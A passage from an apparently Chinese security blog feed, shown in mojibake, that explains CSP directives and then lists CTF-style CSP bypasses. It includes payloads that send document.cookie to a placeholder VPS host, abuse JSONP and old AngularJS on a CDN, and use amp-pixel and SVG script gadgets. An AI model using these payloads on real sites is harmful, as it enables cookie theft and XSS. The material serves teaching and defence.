*.trusted.com</span><br></pre></td></tr></table></figure></li><li><p>ä¸€ä¸ªç½‘ç«™ç®¡ç†è€…å…è®¸ç½‘é¡µåº”ç”¨çš„ç”¨æˆ·åœ¨ä»–ä»¬è‡ªå·±çš„å†…å®¹ä¸­åŒ…å«æ¥è‡ªä»»ä½•æºçš„å›¾ç‰‡ï¼Œä½†æ˜¯é™åˆ¶éŸ³é¢‘æˆ–è§†é¢‘éœ€ä»ä¿¡ä»»çš„èµ„æºæä¾›è€…ï¼Œæ‰€æœ‰è„šæœ¬å¿…é¡»ä»ç‰¹å®šä¸»æœºæœåŠ¡å™¨è·å–å¯ä¿¡çš„ä»£ç ã€‚</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span><span class="punctuation">: </span>default-src &#x27;self&#x27;; img-src *; media-src media1.com media2.com; script-src userscripts.example.com</span><br></pre></td></tr></table></figure><p>åœ¨è¿™é‡Œï¼Œå„ç§å†…å®¹é»˜è®¤ä»…å…è®¸ä»æ–‡æ¡£æ‰€åœ¨çš„æºè·å–ï¼Œä½†å­˜åœ¨å¦‚ä¸‹ä¾‹å¤–ï¼š</p><ul><li>å›¾ç‰‡å¯ä»¥ä»ä»»ä½•åœ°æ–¹åŠ è½½ (æ³¨æ„â€œ*â€é€šé…ç¬¦)ã€‚</li><li>å¤šåª’ä½“æ–‡ä»¶ä»…å…è®¸ä» media1.com å’Œ media2.com åŠ è½½ï¼ˆä¸å…è®¸ä»è¿™äº›ç«™ç‚¹çš„å­åŸŸåï¼‰ã€‚</li><li>å¯è¿è¡Œè„šæœ¬ä»…å…è®¸æ¥è‡ªäº userscripts.example.comã€‚</li></ul></li><li><p>ä¸€ä¸ªç®¡ç†è€…æƒ³è¦ç¡®ä¿ç½‘ç«™çš„æ‰€æœ‰å†…å®¹éƒ½è¦é€šè¿‡ SSL æ–¹å¼è·å–ï¼Œä»¥é¿å…æ”»å‡»è€…çªƒå¬ç”¨æˆ·å‘å‡ºçš„è¯·æ±‚ã€‚</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span><span class="punctuation">: </span>default-src https://onlinebanking.jumbobank.com</span><br></pre></td></tr></table></figure><p>è¯¥æœåŠ¡å™¨ä»…å…è®¸é€šè¿‡ HTTPS æ–¹å¼å¹¶ä»…ä» onlinebanking.jumbobank.com åŸŸåæ¥è®¿é—®æ–‡æ¡£ã€‚</p></li></ul><h4 id="metaæ ‡ç­¾ä¸¾ä¾‹"><a href="#metaæ ‡ç­¾ä¸¾ä¾‹" class="headerlink" title="metaæ ‡ç­¾ä¸¾ä¾‹"></a>metaæ ‡ç­¾ä¸¾ä¾‹</h4><ul><li>å…è®¸è‡ªèº«cssã€jså’Œé«˜å¾·åœ°å›¾apiã€åœ°å›¾æ•°æ®ã€‚</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;style-src &#x27;self&#x27; &#x27;unsafe-inline&#x27;;script-src &#x27;self&#x27; &#x27;unsafe-inline&#x27; &#x27;unsafe-eval&#x27; https://webapi.amap.com https://restapi.amap.com https://vdata.amap.com https://appx/web-view.min.js;worker-src blob:&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>æ€»ç»“ï¼šä¸¤ç§æ–¹å¼æœ¬è´¨éƒ½æ˜¯é€šè¿‡Content-Security-Policyæ¥ï¼š</p><p>â€‹1.é…ç½®å…è®¸çš„åŸŸåå­åŸŸåã€‚</p><p>â€‹2.é™åˆ¶åªèƒ½é€šè¿‡SSLæ–¹å¼è·å–</p><h4 id="æŒ‡ä»¤è¯´æ˜ï¼š"><a href="#æŒ‡ä»¤è¯´æ˜ï¼š" class="headerlink" title="æŒ‡ä»¤è¯´æ˜ï¼š"></a>æŒ‡ä»¤è¯´æ˜ï¼š</h4><blockquote><p>èµ„æºåŠ è½½é™åˆ¶</p></blockquote><ul><li>**<code>script-src</code>**ï¼šå¤–éƒ¨è„šæœ¬</li><li>**<code>style-src</code>**ï¼šæ ·å¼è¡¨</li><li>**<code>img-src</code>**ï¼šå›¾åƒ</li><li>**<code>media-src</code>**ï¼šåª’ä½“æ–‡ä»¶ï¼ˆéŸ³é¢‘å’Œè§†é¢‘ï¼‰</li><li>**<code>font-src</code>**ï¼šå­—ä½“æ–‡ä»¶</li><li>**<code>object-src</code>**ï¼šæ’ä»¶ï¼ˆæ¯”å¦‚ Flashï¼‰</li><li>**<code>child-src</code>**ï¼šæ¡†æ¶</li><li>**<code>frame-ancestors</code>**ï¼šåµŒå…¥çš„å¤–éƒ¨èµ„æºï¼ˆæ¯”å¦‚<code>&lt;frame&gt;</code>ã€<code>&lt;iframe&gt;</code>ã€<code>&lt;embed&gt;</code>å’Œ<code>&lt;applet&gt;</code>ï¼‰ </li><li>**<code>connect-src</code>**ï¼šHTTP è¿æ¥ï¼ˆé€šè¿‡ XHRã€WebSocketsã€EventSourceç­‰ï¼‰</li><li>**<code>worker-src</code>**ï¼š<code>worker</code>è„šæœ¬</li><li>**<code>manifest-src</code>**ï¼šmanifest æ–‡ä»¶</li></ul><blockquote><p>default-src</p></blockquote><p><code>default-src</code>ç”¨æ¥è®¾ç½®ä¸Šé¢å„ä¸ªé€‰é¡¹çš„é»˜è®¤å€¼ã€‚å¦‚ï¼šdefault-src â€˜selfâ€™â€“&gt;é™åˆ¶<strong>æ‰€æœ‰çš„</strong>å¤–éƒ¨èµ„æºï¼Œéƒ½åªèƒ½ä»å½“å‰åŸŸååŠ è½½ã€‚</p><blockquote><p>å…¶ä»–é™åˆ¶</p></blockquote><ul><li>**<code>block-all-mixed-content</code>**ï¼šHTTPS ç½‘é¡µä¸å¾—åŠ è½½ HTTP èµ„æºï¼ˆæµè§ˆå™¨å·²ç»é»˜è®¤å¼€å¯ï¼‰</li><li>**<code>upgrade-insecure-requests</code>**ï¼šè‡ªåŠ¨å°†ç½‘é¡µä¸Šæ‰€æœ‰åŠ è½½å¤–éƒ¨èµ„æºçš„ HTTP é“¾æ¥æ¢æˆ HTTPS åè®®</li><li>**<code>plugin-types</code>**ï¼šé™åˆ¶å¯ä»¥ä½¿ç”¨çš„æ’ä»¶æ ¼å¼</li><li>**<code>sandbox</code>**ï¼šæµè§ˆå™¨è¡Œä¸ºçš„é™åˆ¶ï¼Œæ¯”å¦‚ä¸èƒ½æœ‰å¼¹å‡ºçª—å£ç­‰ã€‚</li></ul><hr><h3 id="ç»•è¿‡CSP"><a href="#ç»•è¿‡CSP" class="headerlink" title="ç»•è¿‡CSP"></a>ç»•è¿‡CSP</h3><p>çœ‹èµ·æ¥å¦‚æœè¦ç»§ç»­å°è¯•XSSçš„è¯ç¬¬ä¸€æ­¥å°±æ˜¯å…ˆçªç ´CSPå¯¹è·¨åŸŸè®¿é—®çš„é™åˆ¶ã€‚</p><p>æ‰¾äº†å‡ ç§å°è¯•ç»•è¿‡çš„æ–¹æ³•ï¼š</p><h4 id="location-href"><a href="#location-href" class="headerlink" title="location.href"></a>location.href</h4><p>CSPä¸å½±å“location.hrefè·³è½¬ï¼Œå› ä¸ºå½“ä»Šå¤§éƒ¨åˆ†ç½‘ç«™çš„è·³è½¬åŠŸèƒ½éƒ½æ˜¯ç”±å‰ç«¯å®ç°çš„ï¼ŒCSPå¦‚æœé™åˆ¶è·³è½¬ä¼šå½±å“å¾ˆå¤šçš„ç½‘ç«™åŠŸèƒ½ã€‚æ‰€ä»¥ï¼Œç”¨è·³è½¬æ¥ç»•è¿‡CSPè·å–æ•°æ®æ˜¯ä¸€ä¸ªä¸‡èƒ½çš„åŠæ³•ï¼Œè™½ç„¶æ¯”è¾ƒå®¹æ˜“è¢«å‘ç°ï¼Œä½†æ˜¯åœ¨å¤§éƒ¨åˆ†æƒ…å†µä¸‹å¯¹äºæˆ‘ä»¬å·²ç»å¤Ÿç”¨<br> å½“æˆ‘ä»¬å·²ç»èƒ½å¤Ÿæ‰§è¡ŒJSè„šæœ¬çš„æ—¶å€™ï¼Œä½†æ˜¯ç”±äºCSPçš„è®¾ç½®ï¼Œæˆ‘ä»¬çš„cookieæ— æ³•å¸¦å¤–ä¼ è¾“ï¼Œå°±å¯ä»¥é‡‡ç”¨æ­¤æ–¹æ³•ï¼Œå°†cookieæ‰“åˆ°æˆ‘ä»¬çš„vpsä¸Š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">location.href = &quot;vps_ip:xxxx?&quot;+document.cookie</span><br></pre></td></tr></table></figure><p>æ­¤ç§ç»•è¿‡æ–¹å¼é€‚ç”¨äºï¼šå·²ç»èƒ½å¤Ÿæ‰§è¡ŒJSè„šæœ¬ï¼Œéœ€è¦å¤–å¸¦æ•°æ®çš„æƒ…å†µã€‚</p><blockquote><p>å…³äºæ­¤ç§æƒ…å†µè¿˜æœ‰ä¸€ç§åŸºäºLinkæ ‡ç­¾çš„ç»•è¿‡ï¼Œä½†æ˜¯å¥½åƒæ¯”è¾ƒå¤è€ç°åœ¨å¤§éƒ¨åˆ†æµè§ˆå™¨å·²ç»çº¦æŸæ­¤æ ‡ç­¾å¯¼è‡´ä¸é€‚ç”¨äº†</p></blockquote><h4 id="Iframeç»•è¿‡"><a href="#Iframeç»•è¿‡" class="headerlink" title="Iframeç»•è¿‡"></a>Iframeç»•è¿‡</h4><p>å½“ä¸€ä¸ªåŒæºç«™ç‚¹ï¼ŒåŒæ—¶å­˜åœ¨ä¸¤ä¸ªé¡µé¢ï¼Œå…¶ä¸­ä¸€ä¸ªæœ‰CSPä¿æŠ¤çš„Aé¡µé¢ï¼Œå¦ä¸€ä¸ªæ²¡æœ‰CSPä¿æŠ¤Bé¡µé¢ï¼Œé‚£ä¹ˆå¦‚æœBé¡µé¢å­˜åœ¨XSSæ¼æ´ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥åœ¨Bé¡µé¢æ–°å»ºiframeç”¨javascriptç›´æ¥æ“ä½œAé¡µé¢çš„domï¼Œå¯ä»¥è¯´Aé¡µé¢çš„CSPé˜²æŠ¤å®Œå…¨å¤±æ•ˆ</p><p>æœ‰ç‚¹ç±»ä¼¼äºCSRFçš„æ„Ÿè§‰ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Bé¡µé¢ --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> iframe = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;iframe&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">iframe.<span class="property">src</span>=<span class="string">&quot;Aé¡µé¢&quot;</span>;   <span class="comment">//é€šè¿‡iframeæ¥æ“ä½œ</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(iframe);</span></span><br><span class="line"><span class="language-javascript"><span class="built_in">setTimeout</span>(<span class="function">()=&gt;</span><span class="title function_">alert</span>(iframe.<span class="property">contentWindow</span>.<span class="property">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;flag&#x27;</span>).<span class="property">innerHTML</span>),<span class="number">1000</span>);    <span class="comment">//setTimeoutæ˜¯ä¸ºäº†ç•™æ—¶é—´ç»™iframeåŠ è½½</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="jsonpç»•è¿‡"><a href="#jsonpç»•è¿‡" class="headerlink" title="jsonpç»•è¿‡"></a>jsonpç»•è¿‡</h4><p>å¤§éƒ¨åˆ†ç«™ç‚¹çš„jsonpæ˜¯å®Œå…¨å¯æ§çš„ï¼Œåªä¸è¿‡æœ‰äº›ç«™ç‚¹ä¼šè®©jsonpä¸è¿”å›htmlç±»å‹é˜²æ­¢ç›´æ¥çš„åå°„å‹XSSï¼Œä½†æ˜¯å¦‚æœå°†urlæ’å…¥åˆ°scriptæ ‡ç­¾ä¸­ï¼Œé™¤éè®¾ç½®x-content-type-optionså¤´ï¼Œå¦è€…å°½ç®¡è¿”å›ç±»å‹ä¸ä¸€è‡´ï¼Œæµè§ˆå™¨ä¾æ—§ä¼šå½“æˆjsè¿›è¡Œè§£æ<br> ä»¥insâ€™hack 2019&#x2F;çš„bypasses-everywhereè¿™é“é¢˜ä¸ºä¾‹ï¼Œé¢˜ç›®ä¸­çš„cspè®¾ç½®äº†<a href="http://www.google.com/">www.google.com</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: script-src www.google.com; img-src *; default-src &#x27;none&#x27;; style-src &#x27;unsafe-inline&#x27;</span><br></pre></td></tr></table></figure><p>çœ‹ä¸Šå»éå¸¸å¤©è¡£æ— ç¼ï¼Œä½†æ˜¯googleç«™ç‚¹å­˜åœ¨äº†ç”¨æˆ·å¯æ§jsonp</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;default-src &#x27;self&#x27;; script-src https://www.google.com&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://www.google.com/complete/searchï¼Ÿclient=chrome&amp;q=hello&amp;callback=alert&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>é…åˆæ³¨é‡Šç¬¦ï¼Œæˆ‘ä»¬å³å¯æ‰§è¡Œä»»æ„js<br> ä¸‹é¢æ˜¯ä¸€äº›å­˜åœ¨ç”¨æˆ·å¯æ§èµ„æºæˆ–è€…jsonpæ¯”è¾ƒå¸¸ç”¨ç«™ç‚¹çš„githubé¡¹ç›®<br> <a href="https://github.com/google/csp-evaluator/blob/master/whitelist_bypasses/jsonp.js#L32-L180">https://github.com/google/csp-evaluator/blob/master/whitelist_bypasses/jsonp.js#L32-L180</a><br> åˆ©ç”¨æ¡ä»¶:</p><ol><li>ç«™ç‚¹å­˜åœ¨å¯æ§Jsonp</li><li>ç«™ç‚¹åœ¨CSPç™½åå•ä¸­</li></ol><h4 id="CDNç»•è¿‡"><a href="#CDNç»•è¿‡" class="headerlink" title="CDNç»•è¿‡"></a>CDNç»•è¿‡</h4><p>ä¸€èˆ¬æ¥è¯´ï¼Œå‰ç«¯ä¼šç”¨åˆ°è®¸å¤šçš„å‰ç«¯æ¡†æ¶å’Œåº“ï¼Œéƒ¨åˆ†ä¼ä¸šä¸ºäº†å‡è½»æœåŠ¡å™¨å‹åŠ›æˆ–è€…å…¶ä»–åŸå› ï¼Œå¯èƒ½ä¼š<strong>å¼•ç”¨å…¶ä»–CDNä¸Šçš„JSæ¡†æ¶</strong>ï¼Œå¦‚æœ<strong>CDNä¸Šå­˜åœ¨ä¸€äº›ä½ç‰ˆæœ¬çš„æ¡†æ¶</strong>ï¼Œå°±å¯èƒ½å­˜åœ¨ç»•è¿‡CSPçš„é£é™©</p><blockquote><p>ä¸¾ä¾‹</p></blockquote><ul><li>æŸä¸ªæ¡ˆä¾‹ä¸­hackmdé‡Œçš„CSPå¼•ç”¨äº†cloudflare.com CDNæœåŠ¡ï¼Œäºæ˜¯é‡‡ç”¨ä½ç‰ˆæœ¬çš„angular jsæ¨¡æ¿æ³¨å…¥æ¥ç»•è¿‡CSPï¼Œå¦‚ä¸‹</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;default-src &#x27;self&#x27;; script-src &#x27;unsafe-eval&#x27; https://cdnjs.cloudflare.com;&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- foo=&quot;--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.min.js</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">ng-app</span>&gt;</span></span><br><span class="line">    &#123;&#123;constructor.constructor(&#x27;alert(document.cookie)&#x27;)()&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><p>ä¾‹å¦‚å‡è®¾é¡µé¢ä¸­ä½¿ç”¨äº†Jquery-mobileåº“ï¼Œå¹¶ä¸”CSPç­–ç•¥ä¸­åŒ…å«â€script-src â€˜unsafe-evalâ€™â€æˆ–è€…â€script-src â€˜strict-dynamicâ€™â€ï¼Œé‚£ä¹ˆä¸‹é¢çš„å‘é‡å°±å¯ä»¥ç»•è¿‡CSPï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">data-role</span>=<span class="string">popup</span> <span class="attr">id</span>=<span class="string">&#x27;&lt;script&gt;alert(1)&lt;/script&gt;&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>è¿˜æœ‰ä¸€äº›åº“ä¹Ÿå¯ä»¥è¢«åˆ©ç”¨ï¼Œä¾‹å¦‚RCTF2018ä¸­é‡åˆ°çš„ampåº“ï¼Œä¸‹é¢çš„æ ‡ç­¾å¯ä»¥è·å–åå­—ä¸ºFLAGçš„cookie</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">amp-pixel</span> <span class="attr">src</span>=<span class="string">&quot;http://your domain/?cid=CLIENT_ID(FLAG)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">amp-pixel</span>&gt;</span>  </span><br></pre></td></tr></table></figure></li></ul><p>è¡¥å……ï¼š<a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf">blackhat2017æœ‰ç¯‡pptæ€»ç»“äº†å¯ä»¥è¢«ç”¨æ¥ç»•è¿‡CSPçš„ä¸€äº›JSåº“</a></p><h4 id="SVGç»•è¿‡"><a href="#SVGç»•è¿‡" class="headerlink" title="SVGç»•è¿‡"></a>SVGç»•è¿‡</h4><p>SVGä½œä¸ºä¸€ä¸ªçŸ¢é‡å›¾ï¼Œä½†æ˜¯å´èƒ½å¤Ÿæ‰§è¡Œjavascriptè„šæœ¬ï¼Œå¦‚æœé¡µé¢ä¸­å­˜åœ¨ä¸Šä¼ åŠŸèƒ½ï¼Œå¹¶ä¸”æ²¡æœ‰è¿‡æ»¤svgï¼Œé‚£ä¹ˆå¯ä»¥é€šè¿‡ä¸Šä¼ æ¶æ„svgå›¾åƒæ¥xss</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> standalone=<span class="string">&quot;no&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">svg</span> <span class="keyword">PUBLIC</span> <span class="string">&quot;-//W3C//DTD SVG 1.1//EN&quot;</span> <span class="string">&quot;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">version</span>=<span class="string">&quot;1.1&quot;</span> <span class="attr">id</span>=<span class="string">&quot;Layer_1&quot;</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="attr">xmlns:xlink</span>=<span class="string">&quot;http://www.w3.org/1999/xlink&quot;</span> <span class="attr">x</span>=<span class="string">&quot;0px&quot;</span> <span class="attr">y</span>=<span class="string">&quot;0px&quot;</span> <span class="attr">width</span>=<span class="string">&quot;100px&quot;</span> <span class="attr">height</span>=<span class="string">&quot;100px&quot;</span> <span class="attr">viewBox</span>=<span class="string">&quot;0 0 751 751&quot;</span> <span class="attr">enable-background</span>=<span class="string">&quot;new 0 0 751 751&quot;</span> <span class="attr">xml:space</span>=<span class="string">&quot;preserve&quot;</span>&gt;</span>  <span class="tag">&lt;<span class="name">image</span> <span class="attr">id</span>=<span class="string">&quot;image0&quot;</span> <span class="attr">width</span>=<span class="string">&quot;751&quot;</span> <span class="attr">height</span>=<span class="string">&quot;751&quot;</span> <span class="attr">x</span>=<span class="string">&quot;0&quot;</span> <span class="attr">y</span>=<span class="string">&quot;0&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">href</span>=<span class="string">&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAu8AAALvCAIAAABa4bwGAAAAIGNIUk0AAHomAACAhAAA+gAAAIDo&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span>   //æ³¨å…¥javasript</span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="CRLFç»•è¿‡"><a href="#CRLFç»•è¿‡" class="headerlink" title="CRLFç»•è¿‡"></a>CRLFç»•è¿‡</h4><p>HCTF2018çš„ä¸€é“é¢˜ï¼Œå½“ä¸€ä¸ªé¡µé¢å­˜åœ¨CRLFæ¼æ´æ—¶ï¼Œä¸”æˆ‘ä»¬çš„å¯æ§ç‚¹åœ¨CSPä¸Šæ–¹ï¼Œå°±å¯ä»¥é€šè¿‡æ³¨å…¥å›è½¦æ¢è¡Œï¼Œå°†CSPæŒ¤åˆ°HTTPè¿”å›ä½“ä¸­ï¼Œè¿™æ ·å°±ç»•è¿‡äº†CSP<br> <a href="https://github.com/Lou00/HCTF2018_Bottle">åŸé¢˜github</a></p><h4 id="å…¶ä»–"><a href="#å…¶ä»–" class="headerlink" title="å…¶ä»–"></a>å…¶ä»–</h4><p>è¿˜æœ‰å…¶ä»–çš„ç»•è¿‡æ–¹å¼ï¼Œå¤šå‡ºç°åœ¨å›½å¤–çš„å¾ˆå¤šCTFæ¯”èµ›ä¸­</p><ul><li>ç«™ç‚¹å¯æ§é™æ€èµ„æºç»•è¿‡</li><li>Base-uriç»•è¿‡</li><li>ä¸å®Œæ•´scriptæ ‡ç­¾ç»•è¿‡nonce</li><li>object-srcç»•è¿‡ï¼ˆPDFXSSï¼‰</li><li>ä¸å®Œæ•´çš„èµ„æºæ ‡ç­¾è·å–èµ„æº</li><li>CSSé€‰æ‹©å™¨è·å–å†…å®¹</li></ul><h4 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h4><p><strong>å†…å®¹å®‰å…¨ç­–ç•¥ CSP</strong>ç¡®å®åœ¨ä¸€å®šç¨‹åº¦ä¸Šæ£€æµ‹å¹¶å‰Šå¼±æŸäº›ç‰¹å®šç±»å‹çš„æ”»å‡»ï¼Œç‰¹åˆ«æ˜¯XSSå’Œæ•°æ®æ³¨å…¥æ”»å‡»ç­‰å‰ç«¯æ”»å‡»ï¼Œè¿›ä¸€æ­¥åŠ å¼ºäº†æµè§ˆå™¨çš„åŒæºç­–ç•¥ã€‚ä½†æ˜¯ä¹Ÿéœ€è¦å¼€å‘è€…æ­£ç¡®ä¸¥æ ¼é…ç½®ï¼ŒåŒæ—¶ç»•è¿‡æ–¹å¼ä¹Ÿå¾ˆå¤šã€‚å¾ˆå¤šå®æˆ˜åœºæ™¯ä¸‹ç›´æ¥åˆ©ç”¨location.hrefæˆ–è€…å…¶ä»–åŒç«™ç‚¹çš„è·³è½¬å°±èƒ½æˆåŠŸç»•è¿‡ã€‚ä½†æ˜¯å…¶åˆ©ç”¨ç™½åå•æœç»æ³¨å…¥è„šæœ¬çš„æ€è·¯éå¸¸æ­£ç¡®ã€‚</p><h1 id="å…³äºå‰ç«¯å®‰å…¨çš„ä¸€äº›æ€è€ƒ"><a href="#å…³äºå‰ç«¯å®‰å…¨çš„ä¸€äº›æ€è€ƒ" class="headerlink" title="å…³äºå‰ç«¯å®‰å…¨çš„ä¸€äº›æ€è€ƒ"></a>å…³äºå‰ç«¯å®‰å…¨çš„ä¸€äº›æ€è€ƒ</h1><p>å‰ç«¯å®‰å…¨çœ‹ä¼¼å±å®³å¾ˆå°ä½†æ˜¯å¾ˆå¤šæ—¶å€™å¾€å¾€æ˜¯ä¸€ä¸ªç½‘ç«™ä¹ƒè‡³æ•´ä¸ªåŸŸæºƒè´¥çš„ç¬¬ä¸€æ­¥ã€‚è€ŒXSSå’ŒCSRFåˆæ˜¯å‰ç«¯å®‰å…¨é—®é¢˜çš„ä¸»è¦é‡ç¾åŒºã€‚äºŒè€…åœ¨åŸç†ä¸Šæœ‰å¾ˆå¤šå…±æ€§ä¹Ÿæœ‰å¾ˆå¤šåŒºåˆ«ã€‚</p><p>XSS åˆ©ç”¨çš„æ˜¯ç”¨æˆ·å¯¹æŒ‡å®šç½‘ç«™çš„ä¿¡ä»»ï¼ŒCSRF åˆ©ç”¨çš„æ˜¯ç½‘ç«™å¯¹ç”¨æˆ·ç½‘é¡µæµè§ˆå™¨çš„ä¿¡ä»»ã€‚å½’æ ¹åˆ°åº•å°±æ˜¯ä¸€ä¸ªä¿¡ä»»é—®é¢˜ï¼Œç«™åœ¨é˜²æŠ¤çš„è§’åº¦ï¼Œè‡ªç„¶æ˜¯å°½å¯èƒ½çš„é™ä½æµè§ˆå™¨ã€å®¢æˆ·ç«¯ã€æœåŠ¡ç«¯å„è‡ªä¹‹é—´çš„ä¿¡ä»»åº¦ã€‚æˆ–è€…è¯´ï¼Œä¸¥æ ¼æ ¡éªŒè¿™ä¸‰æ–¹ä¹‹é—´äº¤äº’çš„è¿‡ç¨‹ä¸­æ•°æ®çš„å¯ä¿¡åº¦ã€‚ç¼–ç ï¼Œè½¬ä¹‰ï¼Œå¢åŠ ç™»å½•éªŒè¯tokenéªŒè¯ï¼ŒCSPé™åˆ¶è·¨åŸŸç­‰ç­‰éƒ½æ˜¯ä¸ºäº†å®ç°è¿™ä¸ªé—®é¢˜ã€‚ç„¶è€Œç«™åœ¨ä¸šåŠ¡çš„è§’åº¦ä¸Šè€ƒè™‘ï¼Œåœ¨è¿™éªŒè¯è¿‡ç¨‹ä¸­åˆè¦åŠ ä¸Šç”¨æˆ·ä½“éªŒæ„Ÿå’Œç½‘ç«™æœåŠ¡åº¦çš„è€ƒé‡ï¼Œæœ€ç»ˆåº”è¯¥æ˜¯å„ä¸ªè§’åº¦ç»¼åˆè€ƒè™‘ä¸‹çš„æŠ˜ä¸­æ–¹æ¡ˆã€‚</p><p>æ€»è€Œè¨€ä¹‹ï¼ŒCSPç­–ç•¥çš„å®Œå–„ï¼ŒåŠ å¼ºåŒæºç­–ç•¥çš„å®æ–½ï¼›å’Œç ”ç©¶æ›´åŠ å®Œå¤‡çš„æ–¹æ¡ˆè¿›åˆ¶ç¬¬ä¸‰æ–¹cookieçš„æ»¥ç”¨ï¼Œå°†æ˜¯ä¸€ä¸ªä»»é‡è€Œé“è¿œçš„ä»»åŠ¡ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å–é…’ä¸ºäº†é†‰ï¼ŒæŠ½çƒŸä¸ºäº†é†’</title>
      <link href="/2023/12/19/%E5%96%9D%E9%85%92%E4%B8%BA%E4%BA%86%E9%86%89%EF%BC%8C%E6%8A%BD%E7%83%9F%E4%B8%BA%E4%BA%86%E9%86%92/"/>
      <url>/2023/12/19/%E5%96%9D%E9%85%92%E4%B8%BA%E4%BA%86%E9%86%89%EF%BC%8C%E6%8A%BD%E7%83%9F%E4%B8%BA%E4%BA%86%E9%86%92/</url>
      
